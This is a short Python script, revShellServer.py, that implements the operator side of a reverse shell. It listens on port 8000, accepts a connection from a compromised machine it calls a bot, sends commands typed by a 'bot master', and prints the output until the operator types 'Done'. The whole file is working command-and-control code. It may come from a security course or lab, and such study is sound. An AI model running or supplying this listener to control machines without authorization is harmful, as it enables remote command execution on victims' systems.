#revShellServer.py

# Import relevant libraries 
from socket import * 

# Create a Socket and bind it to a port number 
serverPort = 8000 
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort))

# Start listening for incoming data 
serverSocket.listen(1)
print("Bot master listening and awaiting instructions") 
connectionSocket, addr = serverSocket.accept()
print("Connection established with " + str(addr)) 
message = connectionSocket.recv(1024) 
print(message) 

# While command is not Done continue to send commands and receive data  
command = "" 
while command != "Done": 
    command = input("Please enter a bot command: ") 
    connectionSocket.send(command.encode()) 
    message = connectionSocket.recv(1024).decode() 
    print(message) 

# When command is Done, shutdown connection and close socket 
connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close() 